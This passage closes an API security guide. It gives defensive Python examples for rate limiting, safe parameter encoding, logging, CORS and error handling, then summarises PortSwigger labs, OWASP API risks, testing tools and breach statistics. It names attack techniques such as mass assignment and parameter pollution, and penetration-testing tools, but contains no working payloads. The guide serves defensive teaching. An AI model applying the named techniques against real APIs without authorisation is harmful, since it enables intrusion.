@limiter.limit("5 per minute")
def login():
    # Strict limit for authentication
    pass

@app.route('/api/expensive-operation', methods=['POST'])
@limiter.limit("10 per hour")
def expensive_operation():
    pass

# Cost-based rate limiting
def cost_based_limit(cost):
    def decorator(f):
        @wraps(f)
        def decorated(*args, **kwargs):
            user_id = get_current_user_id()
            if not check_user_quota(user_id, cost):
                return jsonify({"error": "Quota exceeded"}), 429
            deduct_quota(user_id, cost)
            return f(*args, **kwargs)
        return decorated
    return decorator
```

---

### 5. Secure Parameter Handling (SSPP Prevention)

```python
import urllib.parse
import string

def safe_api_call(username):
    # 1. Validate input
    if not username.isalnum():
        raise ValueError("Invalid username format")

    # 2. Use allowlist for valid characters
    allowed_chars = set(string.ascii_letters + string.digits + '_-')
    if not all(c in allowed_chars for c in username):
        raise ValueError("Invalid characters")

    # 3. Proper encoding
    safe_username = urllib.parse.quote(username, safe='')

    # 4. Make API call
    url = f"https://internal-api/users/{safe_username}/profile"
    response = requests.get(url)
    return response.json()

# Better - use parameterized requests
def safe_api_call_v2(username):
    response = requests.get(
        "https://internal-api/users/profile",
        params={"username": username}  # Auto-encoded
    )
    return response.json()
```

---

### 6. Comprehensive Logging & Monitoring

```python
import logging
from datetime import datetime

logger = logging.getLogger(__name__)

def log_api_request(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        start_time = datetime.now()

        logger.info({
            'event': 'api_request',
            'method': request.method,
            'path': request.path,
            'user_id': getattr(request, 'current_user', {}).get('id'),
            'ip': request.remote_addr,
            'timestamp': start_time.isoformat()
        })

        try:
            response = f(*args, **kwargs)
            logger.info({
                'event': 'api_response',
                'path': request.path,
                'status': response[1] if isinstance(response, tuple) else 200,
                'duration_ms': (datetime.now() - start_time).total_seconds() * 1000
            })
            return response
        except Exception as e:
            logger.error({
                'event': 'api_error',
                'path': request.path,
                'error': str(e),
                'user_id': getattr(request, 'current_user', {}).get('id')
            })
            raise
    return decorated
```

---

### 7. Secure CORS Configuration

```python
from flask_cors import CORS

# CORRECT - Restrictive CORS
CORS(app,
     origins=['https://trusted-domain.com'],
     methods=['GET', 'POST', 'PUT', 'DELETE'],
     allow_headers=['Content-Type', 'Authorization'],
     supports_credentials=True,
     max_age=3600)

# Dynamic CORS
@app.after_request
def apply_cors(response):
    origin = request.headers.get('Origin')
    allowed = get_allowed_origins()

    if origin in allowed:
        response.headers['Access-Control-Allow-Origin'] = origin
        response.headers['Access-Control-Allow-Credentials'] = 'true'

    return response
```

---

### 8. Error Handling Without Information Disclosure

```python
class APIError(Exception):
    def __init__(self, message, status_code=400):
        self.message = message
        self.status_code = status_code

@app.errorhandler(APIError)
def handle_api_error(error):
    response = {'error': error.message, 'status': error.status_code}

    # DON'T include: stack traces, internal errors, database errors, file paths
    # DO include: generic message, error code, sanitized validation errors

    if app.debug:  # Only in development
        response['debug_info'] = str(error)

    return jsonify(response), error.status_code

@app.route('/api/user/<user_id>')
def get_user(user_id):
    try:
        user = User.query.get(user_id)
        if not user:
            # WRONG: "User 12345 not found in database"
            # RIGHT:
            raise APIError("Resource not found", 404)

        if not can_access(request.current_user, user):
            # WRONG: "User john@example.com cannot access admin jane@example.com"
            # RIGHT:
            raise APIError("Access denied", 403)

        return jsonify(user.to_dict())
    except SQLAlchemyError as e:
        logger.error(f"Database error: {str(e)}")
        error_id = generate_error_id()
        raise APIError(f"Error occurred. Reference: {error_id}", 500)
```

---

## Summary & Key Takeaways

### PortSwigger Labs Summary

5 comprehensive labs covering:
1. **API Documentation Exploitation** - Exposed Swagger/OpenAPI
2. **Unused Endpoints** - HTTP method enumeration
3. **Mass Assignment** - Hidden parameter exploitation
4. **Query String Pollution** - Backend parameter injection
5. **REST Path Pollution** - Path traversal to internal APIs

### Critical Vulnerability Categories

1. **Authorization Failures (API1, API3, API5)** - Most common and impactful
2. **Authentication Issues (API2)** - Direct compromise
3. **Mass Assignment (API3)** - Hidden parameters
4. **Server-Side Parameter Pollution** - Backend manipulation
5. **Resource Exhaustion (API4)** - DoS and costs
6. **Business Logic (API6)** - Automated abuse
7. **Configuration Issues (API8, API9)** - Systemic weaknesses

### Essential Testing Tools

**Commercial:** Burp Suite, APIsec, 42Crunch, Salt Security
**Open-Source:** OWASP ZAP, Ffuf, Arjun, Kiterunner, Nuclei
**Burp Extensions:** OpenAPI Parser, Param Miner, Content Type Converter, JS Link Finder, Autorize

### Top Prevention Strategies

1. Authentication & authorization on every endpoint
2. Input validation with allowlist approach
3. Mass assignment protection via DTOs
4. Rate limiting and resource controls
5. API inventory management
6. Monitoring and anomaly detection
7. Secure configuration
8. Regular testing

### Real-World Impact Statistics

- 15M users affected (Trello 2024)
- 49M records (Dell 2024)
- $250K bug bounty (Coinbase 2025)
- 99% of organizations experienced API security issues (Q1 2025)
- $2.5B cost from API vulnerabilities (2024)

### Modern Attack Trends (2025)

1. **Parsing Discrepancies** - WAF vs backend interpretation
2. **Business Logic Attacks** - Up 10% since 2023 (27% of API attacks)
3. **Supply Chain** - Third-party API compromises
4. **Automated Attacks** - 88% leverage OWASP Top 10
5. **Account Takeover** - 46% of API attacks (up from 35% in 2022)

---

## References & Sources

- [PortSwigger Web Security Academy - API Testing](https://portswigger.net/web-security/api-testing)
- [OWASP API Security Top 10 2023](https://owasp.org/API-Security/editions/2023/en/0x11-t10/)
- [Salt Security - OWASP API Top 10 Explained](https://salt.security/blog/owasp-api-security-top-10-explained)
- [Traceable AI - 2025 State of API Security Report](https://www.traceable.ai/2025-state-of-api-security)
- [APIsec - Real-World API Security Breaches](https://www.apisec.ai/blog/real-world-api-security-breaches-lessons-from-major-attacks)
- [IEEE - Web API Security Vulnerabilities](https://ieeexplore.ieee.org/document/9653437/)
- [OWASP - Mass Assignment Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html)
- [OWASP - Secure Coding Practices](https://owasp.org/www-project-secure-coding-practices-quick-reference-guide/)

---

*Last Updated: January 2025*
*Comprehensive guide based on PortSwigger labs, OWASP guidelines, and current industry research*
